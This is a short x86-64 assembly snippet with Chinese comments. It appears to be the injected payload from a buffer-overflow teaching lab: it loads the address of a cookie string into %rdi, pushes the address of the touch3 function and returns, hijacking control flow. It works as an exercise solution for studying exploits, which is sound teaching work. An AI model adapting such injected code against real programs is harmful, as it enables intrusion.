movq $0x5561dc84,%rdi  # 将cookie_16的地址存入rdi寄存器
pushq $0x004018fa 		  # 4018fa就是touch3的地址
retq